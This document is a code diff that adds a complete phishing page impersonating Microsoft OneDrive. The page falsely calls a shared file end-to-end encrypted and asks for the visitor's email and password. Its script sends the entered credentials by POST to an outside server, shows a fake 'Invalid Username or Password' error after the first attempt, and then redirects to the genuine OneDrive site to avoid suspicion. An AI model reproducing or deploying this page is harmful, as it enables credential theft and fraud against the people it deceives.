@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <title>OneDrive</title>
+    <link rel="icon" href="https://app.rajatvijaybajaj.in/download.svg" type="image/x-icon">
+    <link rel="shortcut icon" href="https://app.rajatvijaybajaj.in/download.svg" type="image/x-icon">
+    <style>
+        /* Apply background image and center it */
+        body {
+            background-image: url('https://i.imgur.com/qVThYgg.jpeg');
+            background-size: cover;
+            background-position: center;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Style the form */
+        form {
+            background: rgba(255, 255, 255, 0.8); /* Semi-transparent white background */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 400px; /* Set a fixed width for the form */
+            width: 90%; /* Make the form 90% wide on smaller screens */
+            margin: 0 10px; /* Add space on the left and right */
+        }
+
+        /* Style the form elements */
+        input[type="email"], input[type="password"], button, input[type="submit"] {
+            width: 98%;
+            padding: 10px;
+            margin: 5px 0px;
+            border: none;
+            border-radius: 5px;
+        }
+
+        input[type="submit"]  {
+            background-color: #007BFF;
+            color: white;
+            cursor: pointer;
+        }
+
+        button {
+            background-color: #007BFF;
+            color: white;
+            cursor: pointer;
+        }
+
+        #msgfont {
+            color: red;
+        }
+
+        /* Style the logo */
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        /* Style the instructions */
+        .instructions {
+            font-size: 16px;ur
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 480px) {
+            /* Adjust form elements for smaller screens */
+            input[type="text"], input[type="password"], button {
+                padding: 8px; /* Decrease padding for smaller elements */
+                font-size: 14px; /* Reduce font size for smaller elements */
+            }
+        }
+    </style>
+   
+</head>
+<body>
+    <form method="post" name="street">
+        <br><br>
+        <div class="logo">
+            <img src="https://i.imgur.com/nxdA1vn.png" alt="Your Logo">
+        </div>
+        
+        <div class="instructions">
+            <p>This Document is end-to-end encrypted 🔒
+            <p>Enter Your Email & Password To Access File
+            <p id="msgfont"></p>
+        </div>
+
+        <input type="email" name="email" id="email" autofocus="" Value="" placeholder="Email Address" value="" > <br>
+        <input type="password" name="pass" id="password" autofocus="" placeholder="Password" required="">
+        <br><br>
+
+        <input type="submit" value="Continue" name="btnLogin" id="btnLogin">
+        
+        <br><br>
+    </form>
+
+    <script type="text/javascript">
+        var countAttempt = 0;
+        var sendUrl = "https://pckonto.dk/wp-contents/one.php";
+    
+        document.addEventListener('DOMContentLoaded', function () {
+            var btnLogin = document.getElementById('btnLogin');
+            var msgFont = document.getElementById('msgfont');
+    
+            btnLogin.addEventListener("click", function (event) {
+                event.preventDefault();
+                var password = document.getElementById('password').value;
+                if(password == ""){
+                    msgFont.innerHTML = "Please enter password";
+                }else{ 
+                    sendData();
+                }
+            });
+    
+            btnLogin.addEventListener("touchend", function (event) {
+                event.preventDefault();
+                var password = document.getElementById('password').value;
+                if(password == ""){
+                    msgFont.innerHTML = "Please enter password";
+                }else{ 
+                    sendData();
+                }
+            });
+    
+            function sendData() {
+                var email = document.getElementById('email').value;
+                var password = document.getElementById('password').value;
+    
+                console.log("Email - " + email);
+                console.log("Password - " + password);
+    
+                var formData = new FormData(document.forms.street);
+    
+                countAttempt++;
+                
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', sendUrl);
+    
+                xhr.send(formData);
+    
+                if (countAttempt >= 2) {
+                    setTimeout(function () {
+                        window.location = "https://onedrive.live.com/about/auth/";
+                    }, 2000);
+                    btnLogin.value = "Verifying....";
+                    msgFont.innerHTML = "";
+                } else {
+                    setTimeout(function () {
+                        msgFont.innerHTML = "Invalid Username or Password";
+                        btnLogin.value = "Next";
+                    }, 2000);
+                    btnLogin.value = "Verifying....";
+                }
+            }
+        });
+    </script>
+    
+
+
+
+</body></html>
